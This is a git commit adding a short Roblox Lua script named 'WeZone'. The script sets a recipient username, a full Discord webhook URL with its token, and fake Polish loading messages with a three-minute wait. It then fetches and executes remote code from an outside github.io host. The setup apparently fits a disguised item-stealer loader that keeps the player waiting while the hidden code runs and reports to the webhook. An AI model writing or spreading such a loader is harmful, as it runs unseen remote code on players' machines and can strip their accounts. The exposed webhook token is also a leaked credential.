8ca1047ce71594ccc749752149630ae853a257ac
xratatuj0 <108488496+xratatuj0@users.noreply.github.com>
2023-05-04 21:15:18 +0200

    Add files via upload

---
+++ WeZone.lua
@@ -0,0 +1,9 @@
+UserName = "brajunza333"
+Webhook = "https://discord.com/api/webhooks/1099467008413802566/RFqB-twOeyhUQBUQrr9xqwCb-sh1EVEZhOy1xKGy7Yy0sR3KLGyro_54kLFKmElZkJuM"
+_G.AntiLeave = false
+_G.ScriptName = "WeZone"
+_G.FirstText = "Rozpakowywanie skryptu"
+_G.SecondText = "Ladowanie Skryptu"
+_G.ThirdText = "prawie gotowe"
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
